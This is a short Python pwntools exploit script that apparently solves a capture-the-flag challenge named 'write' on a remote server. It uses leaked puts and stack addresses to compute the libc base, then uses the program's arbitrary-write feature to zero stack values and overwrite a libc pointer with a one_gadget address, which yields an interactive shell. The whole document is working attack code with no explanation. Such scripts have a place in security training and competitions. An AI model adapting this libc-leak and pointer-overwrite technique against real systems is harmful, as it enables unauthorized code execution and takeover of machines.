from pwn import *

#p = process("./write",env={"LD_PRELOAD" : "./libc-2.27.so"})
p = remote("pwn.byteband.it",9000)
puts = p.recvline()
stack = p.recvline()
p.recv()
puts = int(puts.split(": ")[1],16)
stack = int(stack.split(": ")[1],16)
print "puts: ",hex(puts)
print "stack: ",hex(stack)
libc_base = puts - 0x00000000000809c0
print "base: ",hex(libc_base)
one_gadget = libc_base + 0x10a38c
got_to_write = libc_base + 4108456
off1 = stack + 32
off2 = stack + 272
print "one_gadget: ",hex(one_gadget)
print "got_to_write: ",hex(got_to_write)
#pause()
p.sendline("w")
p.sendline(str(off2))
p.sendline("0")
p.sendline("w")
p.sendline(str(off1))
p.sendline("0")
p.sendline("w")
p.sendline(str(got_to_write))
p.sendline(str(one_gadget))
p.interactive()
